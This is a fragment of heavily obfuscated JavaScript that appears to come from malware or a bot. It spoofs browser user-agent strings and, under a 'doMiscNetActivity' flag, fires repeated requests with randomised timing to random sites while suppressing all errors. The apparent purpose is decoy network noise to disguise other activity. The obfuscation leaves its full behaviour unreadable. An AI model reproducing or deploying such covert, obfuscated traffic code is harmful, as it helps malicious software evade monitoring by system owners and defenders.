      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x65 * -0x5d + 0x99c + 0x1b15; k < -0x1a41 + 0x741 + 0x982 * 0x2; k++)
    setTimeout(f, (-0x364a + -0x4 * -0x9c1 + -0x48a * -0x37) * k * getRandomInt(0x287 + 0x321 + 0x5a7 * -0x1, 0x649 + -0x43 * 0x69 + -0x1535 * -0x1));
  setInterval(() => {
    f();
    for (let l = 0x14cf + -0x1dba + 0x8eb * 0x1; l < -0x1687 + -0x3a * -0x1 + 0x1651; l++)
      setTimeout(f, (-0x3 * 0x8ed7 + -0x86da + 0x31dbf) * l * getRandomInt(0x65 * -0x11 + -0x1 * -0xcb1 + 0x1 * -0x5fb, 0x1 * -0x16eb + 0x1760 + 0x13 * -0x6));
  }, 0x61694 * -0xd + 0x122152 + 0x73f2b2);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x22c5 + 0x30c9 + 0x6aa * 0x2) * getRandomInt(0x98f * -0x3 + -0x1a72 + 0x150 * 0x2a, -0x1 * -0xb1b + 0x11ab * 0x2 + -0x2e6c));
}, 0x1 * -0xce8 + -0x49 * 0x83 + -0x1 * -0x32a7);